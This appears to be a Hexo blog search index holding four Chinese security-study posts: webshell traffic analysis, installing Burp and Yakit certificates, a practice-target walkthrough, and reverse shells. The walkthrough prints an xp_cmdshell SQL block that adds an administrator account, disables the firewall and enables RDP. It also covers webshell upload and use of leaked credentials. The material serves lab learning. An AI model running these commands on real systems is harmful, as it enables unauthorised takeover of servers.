<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>流量分析</title>
      <link href="/2024/01/13/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/01/13/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="一-为什么要学习流量分析："><a href="#一-为什么要学习流量分析：" class="headerlink" title="一.为什么要学习流量分析："></a>一.为什么要学习流量分析：</h1><p>流量分析是一种对网络数据进行监测、收集、解析和研究的过程，通过分析网络中的数据流，可以帮助我们了解和评估网络的性能、安全性以及应用程序的行为。通过进行网络流量分析，可以获得网络中各个节点之间的数据传输速度、延迟、带宽利用率等信息。正确的网络流量分析工具消除了网络安全专业人员手动监控 DNS和 DHCP 日志、目录服务基础设施、配置管理数据库和其他数据源以获得网络运行全面视图的需要。相反，安全人员可以依靠网络流量分析来快速检测异常，网络流量分析可及时检测因网络接口故障和子网不可用以及影响稳定可用性的其他障碍而导致的停机时间。</p><h1 id="二-流量走向图"><a href="#二-流量走向图" class="headerlink" title="二.流量走向图"></a>二.流量走向图</h1><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705135344744-0cd6280f-b861-4be9-abd2-d56e5b5f1f7d.png">分析<br>浏览器请求http的数据包，yakit的监听端口8083，Burp的监听端口8082监听到数据包并抓取，流量从浏览器到Yakit和Burp，再到Clash，最终通过节点出去。<br>爬虫程序中的代理部分，和.exe文件的流量，通过Proxifier代理软件，转到Clash的节点出去。</p><h1 id="三-wireshark网络分析工具的使用："><a href="#三-wireshark网络分析工具的使用：" class="headerlink" title="三.wireshark网络分析工具的使用："></a>三.wireshark网络分析工具的使用：</h1><h2 id="1-介绍："><a href="#1-介绍：" class="headerlink" title="1.介绍："></a>1.介绍：</h2><p>Wireshark是一款网络协议分析工具，它主要工作在网络层及以上的层级。具体来说，Wireshark可以分析的数据包范围包括：网络层：如IPv4、IPv6等协议的数据包。传输层：如TCP、UDP等协议的数据包。数据链路层：如PPP、HDRC、ARP协议的数据包应用层：如HTTP、HTTPS、FTP、SMTP、DNS等应用层协议的数据包。通过wireshark这个工具可以了解特定协议的工作原理，用于网络故障分析、网络性能优化等。Wireshark可以在多种操作系统中运行，包括Windows、Mac OS X和Linux等。</p><h2 id="2-wireshark的重要性："><a href="#2-wireshark的重要性：" class="headerlink" title="2.wireshark的重要性："></a>2.wireshark的重要性：</h2><p>实时监控网络流量：通过监控网络流量，蓝队可以及时发现网络异常流量，如DDoS攻击、僵尸网络、内网攻击等。通过分析异常流量的特征和规律，蓝队可以快速发现攻击源和攻击目标。<br>识别和过滤恶意流量：通过对网络通信流量的深度分析，蓝队可以识别和过滤出恶意流量，如恶意软件、病毒、木马等，有效保护系统安全。<br>分析攻击行为：通过分析攻击流量的特征和行为，蓝队可以了解攻击者的攻击手法和战术，为进一步应对攻击提供参考。<br>收集并分析日志：通过收集和分析网络通信日志，蓝队可以发现潜在的安全漏洞和安全风险，并及时采取措施修补漏洞，提高系统安全性。</p><h2 id="3-pcapng分析"><a href="#3-pcapng分析" class="headerlink" title="3.pcapng分析:"></a>3.pcapng分析:</h2><h3 id="1-蚁剑的pcapng进行分析"><a href="#1-蚁剑的pcapng进行分析" class="headerlink" title="1.蚁剑的pcapng进行分析:"></a>1.蚁剑的pcapng进行分析:</h3><p>1.下载老师的114.pcapng（抓的蚁剑的包）。输入过滤命令：<br>(ip.src_host&#x3D;&#x3D;192.168.2.114 or ip.dst_host&#x3D;&#x3D;192.168.2.114) and http#ip.src_host表示源ip，ip.dst_host表示目标ip，http表示抓取的数据包的协议是http协议。<br>然后按下图操作 <img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705139779611-09f3f039-848b-4ea4-ab88-787628239a73.png">2.红色部分是HTTP请求报文，蓝色字体为HTTP响应报文<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705139922607-827d778d-0d2c-45fb-a47c-df19826ccf4a.png" style="zoom: 67%;" /><br>3.介绍了在线加密和解密网站 <a href="https://icyberchef.com/">https://icyberchef.com/</a><br>通过这个网站对流量包进行分析。<br>to Base64—加密  from—解密<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705140147540-4e5d3c69-f198-496f-afa8-ddc5bb9eeec3.png">4.把下图1过程左边的URL拖到下图的位置，把之前的全部红色部分(请求报文)复制到右上框，下面会出现解密的结果，找到最后一段的后面一部分进行复制。之后在另外一个网页访问 <a href="https://icyberchef.com/">https://icyberchef.com/</a> 把2过程的from base64拖到下图位置，把红色部分的最后一行复制有上框，在右上框从第一个字符一个一个删，直至得到操作者的命令。蚁剑一般是删除前面的七八个字符就会出现结果。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705140771975-a0d4bd05-fc94-4ffe-b859-18df2470525b.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705144032076-320423ef-c914-4b56-861d-368e825c7a3b.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705144055440-9e3ff96c-89f4-4485-a4d9-0caad0bb1ed2.png"><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705144090689-fe9486c2-6b5b-444a-9d1c-161e89ee9637.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1705155343511-5b598686-f186-4d1b-95ea-9dcfc52961c0.png#averageHue=%23fbfbfa&clientId=u954a2200-fb5e-4&from=paste&height=77&id=ucccee2ac&originHeight=96&originWidth=843&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4033&status=done&style=none&taskId=u05d79d94-693b-43eb-861a-ea896e0235d&title=&width=674.4" alt="b0ad5a0c885954d34288435b38708a4.png"></h3><p>特别注意，对流量包进行追踪时捕捉到的来去两个包都要进行查看，否则会漏掉重要的信息。</p><h3 id="2-sqlmap的pcapng进行分析"><a href="#2-sqlmap的pcapng进行分析" class="headerlink" title="2.sqlmap的pcapng进行分析:"></a>2.sqlmap的pcapng进行分析:</h3><p>下载老师的db.pcapng（抓sqlmap的包）输入过滤命令：(ip.src_host&#x3D;&#x3D;192.168.2.70 or ip.dst_host&#x3D;&#x3D;192.168.2.70) and http，然后和之前的步骤一样，追踪流-——&gt;到解码网站解码<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705142088054-8e3366dc-c8c8-435a-99f4-d7c2f055fff3.png"></p><p>对上图的解码出的sql语句分析，获取第9个字符，判断他是否大于1，大于1则返回true,小于1则返回false，下图是比较第8行和第9行的不同。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705143564256-82f024d5-50db-407e-ad75-13cc5d64f04a.png"><br>这里首先是用二分法对数据库的每一位进行了判断，之后一个个进行比较缩小范围，用第一个字母的Acci值与64进行比较，之后进行判断，直到得出结果，一般来说通过二分法进行比较之后最多要七次才会出结果。</p><h1 id="四-四大webshell管理工具"><a href="#四-四大webshell管理工具" class="headerlink" title="四.四大webshell管理工具"></a>四.四大webshell管理工具</h1><p>蚁剑（AntSword）： 蚁剑是一款开源的WebShell客户端，支持多种编程语言和平台。其主要功能包括文件管理、数据库管理、虚拟终端等。蚁剑的特点是具有强大的插件系统，可以扩展其功能。此外，蚁剑的流量特征较为明显，容易被安全设备识别。<br>菜刀（Chopper）： 菜刀是一款经典的WebShell管理工具，具有文件管理、数据库管理、虚拟终端等功能。菜刀的流量特征较为明显，通常会被安全设备识别。菜刀的Webshell通常使用一句话木马，执行函数如@eval、@assert等。<br>下载地址：<br><a href="https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL">https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL</a><br>哥斯拉（Godzilla）： 哥斯拉是一款功能强大的Webshell权限管理工具，支持多种类型的Shell，包括PHP、JSP、ASP等。哥斯拉的特点是全部类型的Shell都能绕过市面上的大部分静态查杀和流量WAF。此外，哥斯拉还具有流量加密功能，可以绕过大部分的流量检测。哥斯拉还自带插件，如冰蝎、蚁剑等，可以实现更多的功能。<br>下载地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a><br>冰蝎（Behinder）： 冰蝎是一款动态二进制加密的Webshell管理客户端，主要基于Java开发，因此可以跨平台使用。冰蝎的特点是客户端基于Java，兼容性较好。冰蝎的Webshell通常使用Base64加密，以避免被检测。其流量特征较为明显，容易被安全设备识别。<br>下载地址：<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91</a><br>哥斯拉和冰蝎所采用的木马均是自己的木马，只要蚁剑和菜刀是同一种木马。<br>详细介绍四款工具进行流量分析的地址：<br><a href="https://wh0ale.github.io/2019/09/11/webshell%E6%B5%81%E9%87%8F%E7%9B%91%E6%B5%8B">https://wh0ale.github.io/2019/09/11/webshell%E6%B5%81%E9%87%8F%E7%9B%91%E6%B5%8B</a></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装证书</title>
      <link href="/2024/01/13/%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/"/>
      <url>/2024/01/13/%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="一-是否安装证书的区别："><a href="#一-是否安装证书的区别：" class="headerlink" title="一.是否安装证书的区别："></a>一.是否安装证书的区别：</h1><p>安装证书就可以抓到https的包，了解https&#x3D;http+SSL，在之前使用http的时候，数据在传输过程中是不加密的，所以只要中间放任意一个流量设备例如burp和yakit这种抓包工具，就可以获取到完整的内容，拿到这些流量可以干什么，首先可以盗取其中的敏感信息，其次可以往里面穿插数据，将一堆的广告信息插入到正常流量里，这样访问正规网站的时候却发现有大量的低俗的广告信息，更严重的会添加钓鱼信息，诱骗访问者进入钓鱼网站进行诈骗，这些问题就出在流量没有加密，只要在链路中间架设任意一个流量设备就可以对内容进行修改，如何解决这个问题就出现了https，就是对流量进行加密，这样中间人拿到流量也是加密的，如果没有对应的密钥没有办法解开内容，自然就不能进行上述违规操作。</p><h1 id="二-证书的种类和作用："><a href="#二-证书的种类和作用：" class="headerlink" title="二.证书的种类和作用："></a>二.证书的种类和作用：</h1><p>安装证书在 Burp Suite 中有以下两种不同的情况和作用(这里以burp suite进行举例，yakit同样如此)：<br>安装根证书：当你使用 Burp Suite 作为代理来拦截 HTTPS 流量时，Burp Suite 会生成一个自签名的根证书。为了让 Burp Suite 能够拦截和解密 HTTPS 流量，你需要将这个自签名的根证书安装到你的操作系统或移动设备中的信任证书库中。这样，你的设备就会信任 Burp Suite 生成的证书，从而在使用 Burp Suite 代理时不会出现证书错误提示。<br>安装客户端证书：有时，在进行 web 应用安全测试时，目标应用可能要求客户端必须提供特定的客户端证书才能与服务端建立安全连接。在这种情况下，你可能需要在 Burp Suite 中安装并配置相应的客户端证书，以便 Burp Suite 可以模拟客户端行为并与目标应用进行安全通信。<br>安装根证书是为了让 Burp Suite 能够拦截解密 HTTPS 流量，而安装客户端证书则是为了模拟客户端行为与目标应用进行安全通信。这两种安装证书的操作在 Burp Suite 中有不同的作用和目的。</p><h1 id="三-Burp-Yakit导入证书"><a href="#三-Burp-Yakit导入证书" class="headerlink" title="三.Burp,Yakit导入证书"></a>三.Burp,Yakit导入证书</h1><h3 id="1-Burp导入证书"><a href="#1-Burp导入证书" class="headerlink" title="1.Burp导入证书"></a>1.Burp导入证书</h3><h4 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h4><p>可以通过设置，导出证书和将其命名为der为后缀的文件之后，导入证书就可以了<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705152017463-3f00abad-ac42-47a1-bdc0-f127cc494b12.png" alt="image.png"><br>之后出现激活成功的字样就代表成功了。</p><h4 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h4><p>1.首先要把Burp Suite的CA证书下载到本地,让火狐浏览器开了127.0.0.1:8082代理才可以下载证书，因为默认是8080，由于8080会与虚拟机的phpstudy的端口进行碰撞会产生端口被占用的情况，所以这里选择8082。也就是要让Burp Suite能抓到浏览器的http包的情况下，才能访问到 <a href="https://burp/">https://burp</a>。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705069863974-8ec09d83-3a32-4c46-a4a8-d9fadccabfcc.png"><br>2.打开下图浏览器代理插件，新建情景模式，协议，服务器，端口按Burp中的修改，改成图中的样子。然后开启代理<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705070095102-c765e123-484b-4637-a503-d024e8ba4c84.png">3.访问<a href="https://burp/">https://burp</a>，下载证书<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705070206807-f0a50752-7af9-463d-95e8-d424524c9531.png">4.在浏览器的设置中搜索证书<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705070443107-59d1bf8c-2134-4e63-88cc-03504042fc23.png">5.导入CA证书，勾选两个信任。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705070477835-b29c9c06-9021-44f6-9b89-40baf4bbbf20.png"><br>6.在火狐浏览器访问百度<a href="https://www.baidu.com/">https://www.baidu.com/</a>，观察Burp的历史记录，发现Burp可以抓到https的包了！<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705070912042-ccb3161b-34ab-43c6-935e-7311b09fa22f.png"></p><h3 id="2-Yakit导入证书"><a href="#2-Yakit导入证书" class="headerlink" title="2.Yakit导入证书"></a>2.Yakit导入证书</h3><p>1.打开Yakit,先点高级配置，再点证书下载。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705071194211-7d936d80-4380-4564-aa64-f2eafca60a09.png">2.可以用浏览器进行<a href="http://mitm/">http://mitm</a>，也可以直接下载证书，除了后缀名不一样之外效果是一样的，导入均可使用<br>firefox和谷歌安装证书时最大的区别就是，firefox没有选择证书的存储位置，而是直接选择证书颁发机构。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705153592505-b42535d7-81f1-45d1-985b-4372806b9751.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705153636613-1c675289-3dfc-4044-bd89-e308112feeb6.png" alt="image.png"></p><h1 id="四-代理流程图："><a href="#四-代理流程图：" class="headerlink" title="四.代理流程图："></a>四.代理流程图：</h1><p>代理分为上游和下游，上游和下游各有两个出口这是代理流量的基本走向。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705151673481-33c161c2-05f8-41c5-a43a-c922cacb1c3b.png" alt="92a5aebc7bbfcf8b5a551cd6a6989a4.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安装证书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安装证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AttackMachine靶机通关教程</title>
      <link href="/2024/01/13/AttackMachine%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
      <url>/2024/01/13/AttackMachine%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一-扫描端口"><a href="#一-扫描端口" class="headerlink" title="一.扫描端口"></a>一.扫描端口</h1><p>下载AttackMachine镜像，打开AttackMachine虚拟机。打开桌面的武器库中的Nmap-Zenmap GUI，输入命令：nmap -p- 192.168.2.197#192.168.2.197是已知端口<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704977290982-e5929f1d-9650-4723-8fd5-e56977aaa9f5.png"><br>用nmap端口扫描工具时需要注意：<br>如果使用的是：nmap 192.168.2.197就只会显示当前的已知常见端口，而不会扫描所有的端口。此时就无法发现27689这个端口。<br>在kali虚拟机中需要使用nmap -Pn 192.168.2.197进行扫描。</p><h1 id="二-扫描目录"><a href="#二-扫描目录" class="headerlink" title="二.扫描目录"></a>二.扫描目录</h1><p>1.打开御剑后台扫描工具，在域名处输入http：&#x2F;&#x2F;192.168.2.197:27689&#x2F; 开始扫描<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704976906442-8b11f617-522d-42f1-b419-0a58f751e467.png"></p><h1 id="三-登录文件上传系统"><a href="#三-登录文件上传系统" class="headerlink" title="三.登录文件上传系统"></a>三.登录文件上传系统</h1><p>1.在武器库的浏览器访问192.168.2.197:27689<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704977914799-6d421459-3b37-42b8-ae5f-847697b8ff04.png">2.因为之前扫到了robots.txt文件，尝试打开另一个网页访问192.168.2.197&#x2F;robots.txt发现有两个文件，但没有什么太大的用处。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704979906080-f51c2b58-3937-4d63-8778-81a6f70ba619.png"><br>3.用kali来扫目录，输入命令dirsearch -u <a href="http://192.1682.197:27689">http://192.1682.197:27689</a> -x 403，402，404<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704980928757-1dafd58e-ff5f-459a-86f7-190c183dbe37.png">发现config.js，config.js 是一个配置文件，它在各种应用程序中用于存储配置设置。这个文件通常包含了应用程序运行所必需的设置，如数据库连接信息、API密钥、服务端口、环境变量等。访问&#x2F;js&#x2F;config.js，发现是一些编码，没有什么用。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704982330794-b03af0a9-d474-45f6-85af-2a0191888e80.png"><br>4.访问default.aspx。发现还是登录页面<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704982665607-9fd2d9ca-61d3-428b-8fcf-2ec2bfda533f.png"><br>5.访问&#x2F;web.config.bak。发现弹出一个窗口。尝试保存config.bak文件。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983417775-3d154fa3-9193-43ef-81c7-5eba48665d5d.png"><br>6.用记事本打开config.bak文件，发现数据库名:FileManage,发现用户名：down 密码：downsql 把这三记录下来。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983553394-f3946d8b-d940-4f9f-892a-3c1d1ec82982.png"></p><h1 id="四-连接sqlserver数据库"><a href="#四-连接sqlserver数据库" class="headerlink" title="四.连接sqlserver数据库:"></a>四.连接sqlserver数据库:</h1><p>1.然后尝试去登录文件上传系统，发现登不进去。然后我们去思考扫描出来的开放的1433端口，sqlserver数据库的默认端口号正是1433端口。我们尝试去连接sqlserver数据库。<br>2.打开武器库的Navicat,连接sqlserver。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704984228374-7982d392-9482-4731-9f7b-9561d6f7ce22.png"><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704984276624-4baab891-e3e4-4a38-9b4a-212766f72045.png">3.填写用户名：down 密码：downsql<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704985551106-513dedfd-e1f9-4681-b1a3-7b7668257598.png"><br>4.找到用户列表userLists，发现admin和他的密码<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704985895843-d5020136-6d97-4265-9afe-fe609608e5ab.png">5.然后去登录admin, 登陆成功，获得第一个key<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704986062311-131dce03-3c06-4c58-ad76-4708e40f490d.png"></p><h2 id="1-上传木马"><a href="#1-上传木马" class="headerlink" title="1.上传木马"></a>1.上传木马</h2><p>1.找到文件上传，翻到第三页，发现文件过长会被截取，因为这是一个aspx网站，所以我们要找一个aspx木马上传。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705061291701-b636fe2e-7d90-499a-920b-dc2162c70cb3.png">2.在武器库中找到aspx木马，找到名称为一句话木马的文件。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705061444832-018f1895-3e39-4db6-8654-dcdd3c88e368.png"><br>3.因为这个木马文件拖不出来，右击它并用cmd打开，用python写web程序。输入命令python -m Simple HttpServer 80 运行这个命令后， Python 解释器将启动 SimpleHTTPServer 服务，并且默认会在当前工作目录下提供一个 HTTP 服务。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705061858380-40d2f8a5-32ac-4a6c-849b-2017e658daa2.png"><br>4.在主机的浏览器访问AttackMachine虚拟机的ip地址，然后下载木马文件。并把这个文件重命名为123defgh.jpg。注意这里对上传的文件名的长度进行了限制，只会截取前32位。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705062398289-36c0a266-30a2-453a-b293-187cb0d8478d.png">5.上传木马成功。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705063261270-8742829a-9543-43dd-8b71-7528e1eb164e.png"></p><h2 id="2-连接蚁剑"><a href="#2-连接蚁剑" class="headerlink" title="2.连接蚁剑"></a>2.连接蚁剑</h2><p>1..然后去找木马的路径，右击这个木马文件，复制链接到另一个网页，删木马名称的几个字母，一般让浏览器访问不到这个文件，它就会报错，显示木马的路径。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705063761816-435e7e19-7d96-4789-96ee-f4400bfa34d7.png"><br>2.复制木马的路径到kali的蚁剑，这里的路径是从upfile开始的，密码为abcd,连接蚁剑。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705064321473-01ee06df-596d-421c-8b87-2d13720087da.png"><br>3.在蚁剑的文件夹里找到了Kay2！<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705064651744-5108cc2a-6076-410e-9291-9089a54ebdd3.png"></p><h2 id="五-xpcmd-shell提权"><a href="#五-xpcmd-shell提权" class="headerlink" title="五.xpcmd_shell提权"></a>五.xpcmd_shell提权</h2><p>1.在config.bak文件里发现了新数据库：FileManage 新用户名sa，新密码cisp-pte@sa 所以我们尝试去Navicat去连接并登录这个数据库（属于SQLserver数据库）。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705064836132-5159adbc-e4d5-41e3-ac22-bda4af23401c.png">2.新建查询，目的是使用命令，实现远程桌面连接。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">USE master</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span></span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span></span><br><span class="line">exec master..xp_cmdshell <span class="string">&#x27;net user admin 1qaz@WSX /add&#x27;</span></span><br><span class="line">exec master..xp_cmdshell <span class="string">&#x27;net localgroup administrators admin /add&#x27;</span></span><br><span class="line">exec master..xp_cmdshell <span class="string">&#x27;netsh firewall set opmode disable&#x27;</span></span><br><span class="line">exec master..xp_cmdshell <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span></span><br><span class="line">exec master..xp_cmdshell <span class="string">&#x27;netstat -anop tcp | find &quot;3389&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705065929566-f24e8c3b-1ef1-4f4f-858e-4faa98ed1f06.png">3.在主机的搜索框内输入rdp,以管理员身份运行远程桌面连接。<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705066664850-12191b19-d7dc-4651-8827-47e2470b9e73.png"><br>4.在新建的查询中改用户名和密码。<img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705067072995-e42e8bba-9cbb-40ef-b4c7-5d0213aac4c6.png#averageHue=%23fcfbfb&clientId=u6cc2c564-ed7c-4&from=paste&height=151&id=u1d44aa3e&originHeight=151&originWidth=495&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8130&status=done&style=none&taskId=u623ee87c-fe33-428c-a153-d6f6a7391d6&title=&width=495#averageHue=%23fcfbfb&from=url&id=yILpt&originHeight=151&originWidth=495&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title="><br>5.重新去实现远程桌面连接，登陆靶机桌面成功，获得最后的key3<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705067046588-31a376a1-e334-4244-853c-e0efceddbeeb.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AttackMachine虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正反向shell</title>
      <link href="/2024/01/13/%E6%AD%A3%E5%8F%8D%E5%90%91shell/"/>
      <url>/2024/01/13/%E6%AD%A3%E5%8F%8D%E5%90%91shell/</url>
      
        <content type="html"><![CDATA[<h1 id="一-概念："><a href="#一-概念：" class="headerlink" title="一.概念："></a>一.概念：</h1><p>正向 shell 是指一个客户端通过网络连接到远程服务器，并在服务器上启动一个交互式 shell 进程。这种连接通常是通过标准的客户端-服务器模型实现的，客户端发送命令到服务器，服务器执行这些命令，并将结果返回给客户端。<br>反向 shell 是指一个远程服务器通过网络连接到客户端，并在客户端上启动一个交互式 shell 进程。这种连接是通过在目标主机上植入恶意代码，使其能够与远程控制服务器建立连接，然后远程执行命令。这种连接方式常用于渗透测试、安全研究或远程管理等场景下。<br>在正向 shell 中，客户端主动连接到服务器，因此需要确保服务器对外可访问，并具有公开的 IP 地址。而在反向 shell 中，服务器主动连接到客户端，因此客户端只需要允许服务器连接到指定的 IP 地址和端口即可。反向 shell 可以绕过一些出站连接的限制，因为服务器会主动发起连接。这使得反向 shell 在某些情况下更难被检测和防御。</p><h1 id="二-实际情况"><a href="#二-实际情况" class="headerlink" title="二.实际情况"></a>二.实际情况</h1><p>有一台kali机，一台靶机，在靶机这里存在防火墙如果是用kali虚拟机去连靶机本地的8883端口可能会被阻塞<br>如果监听的是kali虚拟机上面的8883端口，由靶机进行反弹shell更容易成功。<br>如图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705146428220-ff71696a-1c40-4a4d-b927-3f6bf34b2c0f.png" alt="image.png"><br>如果不是kali虚拟机，而是windows虚拟机就可能存在防火墙。<br>一台linux虚拟机机器支持多用户，存在ssh服务，如果一台linux虚拟机没有可视化界面，需要终端端口进行连接，打开一个终端也就是一个shell,一个终端可以打开多个shell,一整个会话称为一个shell。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705145347846-efdcf2e5-d1e4-4b9c-a78b-32fb03acf235.png" alt="image.png"><br>四种反弹shell。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705147077259-aa81ffa2-8969-468d-b81d-fe2bd5cddb1a.png" alt="image.png"><br>这个反弹shell的命令比较好用：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705147298970-89b40624-ce89-412a-8837-af0d139c78f9.png" alt="image.png"></p><h1 id="三-终端和shell的关系："><a href="#三-终端和shell的关系：" class="headerlink" title="三.终端和shell的关系："></a>三.终端和shell的关系：</h1><p>终端（Terminal）：终端是计算机上的硬件设备，也可以是模拟该设备的软件。它提供了用户与计算机系统交互的界面，允许用户输入命令，查看程序输出和进行交互式操作。在图形用户界面 (GUI) 中，终端通常被称为终端窗口或控制台窗口。终端可以通过键盘和屏幕进行输入和输出，充当了用户和计算机系统之间的交互通道。<br>Shell：Shell 是一个命令行解释器，它是用户与操作系统内核之间的接口。当用户在终端中输入命令时，这些命令由 shell 进行解释并执行。Shell 管理着命令解释、程序执行、环境变量设置以及输入输出重定向等任务。不同的操作系统通常具有自己的 shell，例如在 Unix-like 系统中常见的 shell 包括 Bash、Zsh 和 Fish，而在 Windows 中常见的 shell 则是 Command Prompt 和 PowerShell。<br>终端提供了用户与操作系统的界面，而 shell 则负责解释和执行用户输入的命令。</p><h1 id="四-bash的分类："><a href="#四-bash的分类：" class="headerlink" title="四.bash的分类："></a>四.bash的分类：</h1><p>zsh：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705146283320-b082bcab-23b7-479c-91d6-8a67688755d5.png" alt="image.png"><br>bash:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705146321123-bd106598-bc27-42a3-bf4c-8a692b6bfc21.png" alt="image.png"><br>sh:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705146385864-68abecae-fcc6-4e45-b618-314fb64bbc74.png" alt="image.png"></p><h1 id="四-进程："><a href="#四-进程：" class="headerlink" title="四.进程："></a>四.进程：</h1><p>pstree：进程树。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705147529509-7844043b-9d95-4492-b112-6dd621212cce.png" alt="image.png"><br>ps：查看进程信息。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705147544401-55db3062-5830-4c0f-9e5f-018430f3ca5e.png" alt="image.png"></p><h1 id="五-获得完整shell："><a href="#五-获得完整shell：" class="headerlink" title="五.获得完整shell："></a>五.获得完整shell：</h1><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<br>ctrl +z #放到后台<br>stty raw -echo;fg;reset #这是一个将终端设置为”原始模式”的命令序列。<br>stty raw -echo: 这个命令将终端设置为”原始模式”，意味着终端会把输入的每个字符立即传递给正在运行的程序，而不会进行输入缓冲或特殊字符处理。同时，该命令还关闭了终端的回显功能，这样输入的字符不会被显示在屏幕上。<br>fg: 这个命令将正在后台运行的前台作业切换到前台。如果先前有在后台运行的作业，这个命令将把它们切换到终端的前台执行。<br>reset: 这个命令用于重置终端的设置。它会恢复终端的默认设置，包括字符编码、颜色、光标位置等。reset 命令会清除屏幕上的内容并重新初始化终端。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705147807524-43f9e2d5-5c16-460c-a912-4fcffd40d561.png" 